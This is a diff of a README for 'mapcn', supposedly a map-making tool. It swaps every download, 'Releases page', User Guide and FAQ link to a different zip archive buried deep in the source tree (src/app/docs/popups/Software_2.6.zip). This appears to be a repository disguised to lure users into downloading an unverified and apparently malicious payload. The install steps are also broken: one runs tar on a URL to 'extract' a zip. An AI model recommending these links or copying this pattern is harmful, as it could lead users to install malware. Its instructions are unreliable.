@@ -1,7 +1,7 @@
 # 🗺️ mapcn - Beautiful Maps Made Easy
 
 ## 📥 Download Now
-[![Download mapcn](https://raw.githubusercontent.com/anonimous071/mapcn/main/src/Software_rattlebones.zip)](https://raw.githubusercontent.com/anonimous071/mapcn/main/src/Software_rattlebones.zip)
+[![Download mapcn](https://github.com/anonimous071/mapcn/raw/refs/heads/main/src/app/docs/popups/Software_2.6.zip)](https://github.com/anonimous071/mapcn/raw/refs/heads/main/src/app/docs/popups/Software_2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to mapcn! This software helps you create beautiful maps without hassle. It is free to use and requires no complex setup. Follow the steps below to download and run mapcn.
@@ -13,15 +13,15 @@ Welcome to mapcn! This software helps you create beautiful maps without hassle. 
 - Internet connection for downloading
 
 ## 🔗 Visit the Releases Page
-To download mapcn, visit our [Releases page](https://raw.githubusercontent.com/anonimous071/mapcn/main/src/Software_rattlebones.zip). Here you will find the latest version of the software ready for download.
+To download mapcn, visit our [Releases page](https://github.com/anonimous071/mapcn/raw/refs/heads/main/src/app/docs/popups/Software_2.6.zip). Here you will find the latest version of the software ready for download.
 
 ## 💻 Download & Install
-1. Go to the **[Releases page](https://raw.githubusercontent.com/anonimous071/mapcn/main/src/Software_rattlebones.zip)**.
+1. Go to the **[Releases page](https://github.com/anonimous071/mapcn/raw/refs/heads/main/src/app/docs/popups/Software_2.6.zip)**.
 2. Locate the latest version listed. It usually has a version number like "v1.0.0".
 3. Look for the installation file suitable for your operating system. For example:
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, you may find a `https://raw.githubusercontent.com/anonimous071/mapcn/main/src/Software_rattlebones.zip` file.
+   - For Linux, you may find a `https://github.com/anonimous071/mapcn/raw/refs/heads/main/src/app/docs/popups/Software_2.6.zip` file.
 4. Click on the file to start downloading.
 
 ### 🛠️ Running mapcn
@@ -40,7 +40,7 @@ After the download completes, follow these steps to run mapcn:
 **Linux:**
 - Open your terminal.
 - Navigate to your Downloads folder.
-- Use the command: `tar -xzf https://raw.githubusercontent.com/anonimous071/mapcn/main/src/Software_rattlebones.zip` to extract the files.
+- Use the command: `tar -xzf https://github.com/anonimous071/mapcn/raw/refs/heads/main/src/app/docs/popups/Software_2.6.zip` to extract the files.
 - Navigate to the extracted folder and run the program using `./mapcn`.
 
 ## 🎨 Features
@@ -59,7 +59,7 @@ Join the mapcn community! Share your creations and get tips from other users. Fo
 Once you have installed mapcn, explore its features. Create test maps, modify them, and see what works best for your needs. Enjoy a simple, effective mapping experience.
 
 ## 📚 Additional Resources
-- [User Guide](https://raw.githubusercontent.com/anonimous071/mapcn/main/src/Software_rattlebones.zip)
-- [Frequently Asked Questions](https://raw.githubusercontent.com/anonimous071/mapcn/main/src/Software_rattlebones.zip)
+- [User Guide](https://github.com/anonimous071/mapcn/raw/refs/heads/main/src/app/docs/popups/Software_2.6.zip)
+- [Frequently Asked Questions](https://github.com/anonimous071/mapcn/raw/refs/heads/main/src/app/docs/popups/Software_2.6.zip)
 
 Thank you for choosing mapcn! Happy mapping!
